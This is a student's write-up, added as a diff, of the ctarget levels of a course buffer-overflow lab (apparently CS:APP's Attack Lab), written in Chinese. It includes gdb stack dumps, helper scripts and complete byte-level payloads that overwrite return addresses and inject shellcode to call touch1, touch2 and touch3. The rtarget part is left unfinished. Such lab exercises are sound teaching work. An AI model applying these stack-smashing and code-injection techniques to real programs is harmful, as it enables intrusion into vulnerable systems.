@@ -1,0 +1,164 @@
+在开始正式的做题目之前，首先先查看文件里面的内容：
+
+我的文件夹是target32。
+
+首先题目是在ctarget和rtarget文件当中。此外还有一个叫cookie.txt的文件，其中的内容是0x276adee7，估计是身份的标识之类的，所以暂且放一边。另一个程序是hex2raw，根据README所述，这个程序能够生成byte序列，是非常重要的一个工具，通过实验手册可以看出使用十六进制字符串并用空格间隔输入该程序之后，可以将字符串转换为字节序列。
+例如：
+34 49 ^D
+输出4I。
+
+farm.c与rtarget有关，先暂时放一边。
+
+ctarget：
+首先是ctarget程序，根据实验指导所示，需要让程序调用touch1()，touch2()和touch3()。
+首先使用objdump反汇编整个ctarget程序，发现整个程序没有调用上述三个函数的地方，这就说明需要使用某种途径让这些函数被调用。可以想到的方法就是修改栈的内容，让函数返回的地址被改变，从而引导其调用上述的三个函数。
+在试运行程序的时候，程序需要有输入值，实验手册推荐我们先用hex2raw将输入的内容转换并存入文件之后，再通过重定向的方式，将文件的内容输入。
+在此，使用文件名ctarget.l1，ctarget.l2和ctarget.l3表示用于存储用于攻击touch1()，touch2()和touch3()的文件，这些文件的内容是原始的字符串，没有经过hex2raw程序的转换，而转换过后的内容放在attack.txt文件中。为了方便起见，我写了个脚本"mkraw.sh"来方便转换的过程：
+```SHELL
+if [ -n "$1" ]; then
+    ./hex2raw < "$1" > attack.txt
+else
+    echo "provide \$1"
+fi
+```
+这样就可以将通过提供要转换的文件，来将转换结果输出到attack.txt当中了。接下来，由于一直需要使用gdb调试，为了方便直接配置，我也写了一个脚本"start.sh"：
+```SHELL
+export ATTACKLAB_PARAM=""
+export ATTACKLAB_APP=""
+
+if [ "$1" == "c" ]; then
+    ATTACKLAB_APP="./ctarget"
+    if [ -z "$2" ]; then
+        ATTACKLAB_PARAM="-q"
+    fi
+    gdb $ATTACKLAB_APP --command="my_data/setup"
+elif [ "$1" == "r" ]; then
+    ATTACKLAB_APP="./rtarget"
+    if [ -z "$2" ]; then
+        ATTACKLAB_PARAM="-q"
+    fi
+    gdb $ATTACKLAB_APP --command="my_data/setup"
+else
+    echo "provide 'c' or 'r'"
+fi
+
+unset ATTACKLAB_APP
+unset ATTACKLAB_PARAM
+```SHELL
+由于有两个程序，所以我设置的是如果第一个参数是"c"就执行ctarget，如果第一个参数是"r"就执行rtarget。如果存在第二个参数就在程序的参数中加上"-q"。而my_data/setup中放着设置gdb的指令，比如设置断点什么的。这样就不用反复设置了，而且要改的话只要改这个文件就行了。
+
+phase1：
+首先是touch1()函数，要做到缓冲区攻击，首先得要有让我们输入的地方才行，于是可以检查一下源文件有哪些疑似是输入的函数，我找到的函数如下：__isoc99_sscanf()、fopen()、Gets()和getc()。然后在这些函数处添加断点。通过调试可以发现只有Gets()和getc()函数处被中断了，并且此处是接收输入的地方，调用顺序是main()函数调用stable_launch()函数，然后该函数调用launch()函数，接着调用test()函数，接着再调用getbuf()函数，然后调用Gets()，然后循环调用getc()函数。其中比较关键的函数是getbuf()函数，可以利用该函数的ret来重定向到touch1()函数。
+getbuf()函数首先会执行"sub $0x38,$rsp"，也就是会留出56字节的栈空间，gdb查看栈空间的情况可以得到如下内容：
+0x55619d38:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d48:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d58:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d68:	0x55586000	0x00000000	0x00402086	0x00000000
+0x55619d78:	0x55685fe8	0x00000000	0x004026d6	0x00000000
+0x55619d88:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
+由于<touch1>位于0x401ead,因此只要将0x55619d70处的0x00402086修改为<touch1>的地址值即可，这样的话getbuf()再执行ret时，取到的%rip就为0x401ead，这样就不会跳转回test()，而是被引导到touch1()。至于前面的内容，不是我们关心了，因此之间填充0x00即可，需要填充56字节才可以。而Gets()函数正好可以读取我们输入的内容，将其放入栈中，帮助我们实现这个目标。这样，我们是要在ctarget.l1中输入以下内容：
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ad 1e 40 00
+由于是小端序的，所以最后的地址需要倒过来写。
+调试时，可以发现，程序在执行到getbuf()的ret时进入了<touch1>，然后成功PASS。
+
+phase2：
+这一关仍然使用上一关的思路，由于<touch2>的地址为0x401ee1，因此可以先尝试把最后的"ad 1e 40 00"改成"e1 1e 40 00"，执行后发现失败了。实验手册里给出了<touch2>的源代码：
+void touch2 (unsigned val)
+{
+    vlevel = 2; /* Part of validation protocol */
+    if (val == cookie) {
+        printf("Touch2!: You called touch2(0x%.8x)\n", val);
+        validate(2);
+    } else {
+        printf("Misfire: You called touch2(0x%.8x)\n", val);
+        fail(2);
+    }
+    exit(0);
+}
+可以发现，我们需要让传入的val值等于cookie才行。val的值也就是%edi内的值。观察%rdi寄存器的变化情况，可以发现它最后一次赋值的情况是<Gets+43>位置处的"mov 0x53be(%rip),%rdi"，而该处的值是0x407540的<infile>变量，其值是固定的0x7ffff7e1aaa0，而cookie的值是0x276adee7，并不相等，这就表示必须通过注入指令的方式才能够让%edi的值等于0x276adee7。
+我首先向<getbuf>的栈的起始处注入汇编代码：
+```asm
+mov $0x276adee7,%edi
+pushq $0x401ee1
+ret
+```
+这段代码首先修改了%edi的值，因为这就是目标。然后向栈内压入0x401ee1，也就是<touch2>的地址，这样执行ret时就会立即跳转到<touch2>了。至于上面的"ad 1e 40 00"就得要改成"38 9d 61 55"了，这样结束了<getbuf>之后就会立刻跳转到上述的汇编指令的地方。
+不过，汇编指令首先得要转换为二进制才可以写入ctarget.l2当中，于是首先通过gcc编译得到如下二进制代码：
+   0:	bf e7 de 6a 27       	mov    $0x276adee7,%edi
+   5:	68 e1 1e 40 00       	push   $0x401ee1
+   a:	c3                   	ret    
+然后依序写入ctarget.l2中就行了，当然也得要填充满56字节，因此得用0x00填充。最终的ctarget.l2如下：
+bf e7 de 6a 27 68 e1 1e
+40 00 c3 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+38 9d 61 55
+然后成功PASS。
+
+phase3：
+还是一样，由于<touch3>的地址为0x401ffe，因此可以先尝试把最后的"e1 1e 40 00"改成"fe 1f 40 00"。结果当然是不行。实验手册中<touch3>的源代码如下：
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val,char *sval)
+{
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval)
+{
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+这个函数首先是通过hexmatch()函数判断正确的，而hexmatch()简单来说就是判断两个字符串是否相等。先不关心在比较字符串之前做了什么，首先先查看s字符串的内容，是"276adee7"这就表示了我要输入的sval是指向字符串"276adee7"的指针才行。一开始的想法就是依照phase2中的，但稍微修改的地方在于，使用栈中（0x55619d38）前9字节存放字符串的内容，之后存放汇编指令，用于设置%rdi，然后跳转到<touch3>，大体和phase2相似。但结果是并不能通过，检查字符串之后发现字符串被修改了。我猜测可能是<hexmatch>也会修改栈的内容，所以导致字符串被修改了。不过test()函数也有栈，因此可以使用test()函数的栈。
+由于<test>栈的位置的地址应该大于<getbuf>的，所以可以继续往下查看栈：
+0x55619d38:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d48:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d58:	0x00000000	0x00000000	0x00000000	0x00000000
+0x55619d68:	0x55586000	0x00000000	0x00402086	0x00000000
+0x55619d78:	0x55685fe8	0x00000000	0x004026d6	0x00000000
+0x55619d88:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
+可以看出来0x55619d78开始应该就是<test>的栈了，所以将字符串放置在此处。我在操作时放在了0x55619d80处，因此%rdi设置的是该值。其余的与phase2类似。汇编代码如下：
+```asm
+mov $0x55619d80,%rdi
+pushq $0x401ffe
+ret
+```
+得到的二进制指令如下：
+   0:	48 c7 c7 80 9d 61 55 	mov    $0x55619d80,%rdi
+   7:	68 fe 1f 40 00       	push   $0x401ffe
+   c:	c3                   	ret    
+然后将上面的二进制指令写入ctarget.l3即可，然后填充满56字节之后，写上跳转到这些二进制指令的地址。最后再加上"276adee7"转换为ASCII码的结果即可。第一段mov汇编中指向的地址就是上面字符串的地址。最终ctarget.l3的内容就是：
+48 c7 c7 80 9d 61 55 68
+fe 1f 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+38 9d 61 55 00 00 00 00
+00 00 00 00 00 00 00 00
+32 37 36 61 64 65 65 37
+
+rtarget：
+--------还没做--------
+
